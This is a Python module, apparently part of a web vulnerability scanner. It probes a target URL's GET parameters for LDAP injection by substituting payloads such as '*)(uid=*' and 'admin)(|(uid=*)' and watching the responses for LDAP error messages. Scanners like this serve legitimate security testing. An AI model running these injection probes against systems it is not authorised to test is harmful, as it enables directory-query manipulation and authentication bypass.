#!/usr/bin/env python3
# ldap_injection.py - LDAP Injection Scanner

import re
import requests
import urllib.parse
from typing import Dict, Any, List

PAYLOAD_FILE = "assets/payloads/LDAP Injection.txt"
TIMEOUT = 10

LDAP_ERRORS = [
    "LDAP", "ldap", "search failed",
    "Invalid dn", "Invalid syntax",
    "Operations error", "protocol error",
    "time limit exceeded"
]

def load_payloads() -> List[str]:
    try:
        with open(PAYLOAD_FILE, "r", encoding="utf-8") as f:
            return [line.strip() for line in f if line.strip() and not line.strip().startswith("--")]
    except FileNotFoundError:
        return ["*)(uid=*", "admin)(|(uid=*)"]

def detect_ldap_error(response_text: str) -> bool:
    for pattern in LDAP_ERRORS:
        if re.search(pattern, response_text, re.IGNORECASE):
            return True
    return False

def run(target: str, **kwargs) -> Dict[str, Any]:
    results = {
        "status": "ok",
        "result": {},
        "errors": [],
        "duration": 0
    }
    
    try:
        payloads = load_payloads()
        parsed = urllib.parse.urlparse(target)
        params = urllib.parse.parse_qs(parsed.query)
        
        if not params:
            results["result"]["message"] = "Нет GET-параметров для проверки"
            results["result"]["vulnerable"] = []
            return results
        
        vulnerable = []
        for param in params:
            for payload in payloads[:30]:
                new_params = {k: v[0] if k != param else payload for k, v in params.items()}
                new_query = urllib.parse.urlencode(new_params)
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
                
                try:
                    resp = requests.get(test_url, timeout=TIMEOUT)
                    if detect_ldap_error(resp.text):
                        vulnerable.append({
                            "param": param,
                            "payload": payload,
                            "type": "LDAP Injection"
                        })
                        break
                except Exception as e:
                    results["errors"].append(f"Ошибка для {test_url}: {str(e)}")
        
        results["result"]["vulnerable"] = vulnerable
        results["result"]["count"] = len(vulnerable)
        
        if not vulnerable:
            results["result"]["message"] = "LDAP инъекции не найдены"
        
    except Exception as e:
        results["status"] = "error"
        results["errors"].append(str(e))
    
    return results